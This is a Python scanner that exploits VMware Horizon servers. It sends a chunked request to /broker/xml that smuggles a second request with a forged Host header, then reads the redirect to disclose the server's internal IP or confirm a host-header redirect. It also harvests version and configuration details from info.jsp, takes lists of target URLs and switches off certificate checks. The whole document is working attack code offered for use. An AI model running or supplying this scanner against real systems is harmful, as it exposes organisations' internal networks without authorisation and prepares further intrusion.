#Reaveal the internal vmware horizon ip address through redirection
import requests
import argparse
import re
import sys
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
from urllib import request, parse

parser = argparse.ArgumentParser(description="Vmware Horizon internal IP exposure through redirection", formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("-t", dest="target", required=False, help="IP or Hostname (Example: https://somewhere.com", default="")
parser.add_argument("-c", dest="infos", required=False, action="store_true", help="Get client info from info.jsp")
parser.add_argument("-i", dest="ipadd", required=False, action="store_true", help="Get internal IP address")
parser.add_argument("-l", dest="urlst", required=False, type=argparse.FileType("r", encoding="UTF-8"), help="List of urls")
parser.add_argument("-o", dest="savefile", required=False, type=argparse.FileType("w", encoding="UTF-8"), help="Output file", default="vminfo.txt")

args = parser.parse_args()
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)

target = args.target
infos = args.infos
ipadd = args.ipadd
urlst = args.urlst
savefil = args.savefile
savefile = savefil.name

if urlst:
	urlist = [line.rstrip('\n') for line in urlst]

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
url = target+"/broker/xml"
sheaders = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36", "Connection": "close", "Transfer-Encoding": "chunked"}
nheaders = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36", "Connection": "close"}
sdata = {b"0\r\n\r\nGET /portal HTTP/1.0\r\nHost: cf48h6c2vtc0000t0k.30g81reueyyyyyb.com\r\n\r\n"}
def infograb(URL):
	info = URL+"/portal/info.jsp"
	target1 = urlparse(URL).netloc
	try:
		inf = requests.get(info, verify=False, allow_redirects=False, timeout=10)
		if inf.ok:
			jsoninf = inf.json()
			infograb.clientv = "[.] "+target1+" Client version: "+jsoninf["clientVersion"]
			print(infograb.clientv)
			print("[.] "+target1+" Log level: "+jsoninf["logLevel"])
			print("[.] "+target1+" Context path: "+jsoninf["contextPath"])
			if "csrfCheck" in jsoninf:
				print("[.] "+target1+" Csrf check: "+jsoninf["csrfCheck"])
			if "disableCEIP" in jsoninf:
				print("[.] "+target1+" DisableCEIP: "+jsoninf["disableCEIP"])
			pass
		else:
			print("[!] Request to "+info+" received code: "+str(inf.status_code))
			infograb.clientv = ""
	except requests.exceptions.ConnectionError:
		print("[-] "+target1+" Connection Errors")
		infograb.clientv = ""
		pass
	except requests.exceptions.Timeout:
		print("[-] "+target1+" Connection Timeout")
		infograb.clientv = ""
		pass
	except Exception as abba:
		infograb.clientv = ""
		print(abba)
		pass
def smuggle(URL):
	url1 = URL+"/broker/xml"
	try:
		s = requests.session()
		r = s.post(url1, headers=sheaders, data=sdata, verify=False, allow_redirects=False, timeout=10)
		location = r.headers.get('location')
		target2 = urlparse(URL).netloc
		intip = urlparse(location).netloc
		try:
			intip = intip.decode()
		except (UnicodeDecodeError, AttributeError):
			pass
		if "f48h6c2vtc0000t0k" in intip:
			smuggle.roger = "[#] "+target2+" Vulnerable to host header redirect through smuggling"
			print(smuggle.roger)
		elif intip != "":
			smuggle.roger = "[#] "+target2+" Vulnerable to internal IP address disclosure: "+intip
			print(smuggle.roger)
		else:
			smuggle.roger = "[!] "+target2+" is not vulnerable."
			print(smuggle.roger)
	except requests.exceptions.ConnectionError:
		smuggle.roger = "[-] "+URL+" Connection Errors"
		print(smuggle.roger)
		pass
	except requests.exceptions.Timeout:
		smuggle.roger = "[-] "+URL+" Connection Timeout"
		print(smuggle.roger)
		pass
def ifsave(savestuff):
	file1 = open(savefile, "a+")
	file1.write(savestuff+"\n")
	file1.close
def tpool():
	if target:
		URL = target
		if infos:
			infograb(URL)
			if savefile:
				ifsave(infograb.clientv)
		if ipadd:
			smuggle(URL)
			if savefile:
				ifsave(smuggle.roger)
	elif urlst:
		for URL in urlist:
			if infos:
				infograb(URL)
				if savefile:
					ifsave(infograb.clientv)
			if ipadd:
				smuggle(URL)
				if savefile:
					ifsave(smuggle.roger)
if __name__ == "__main__":
	tpool()

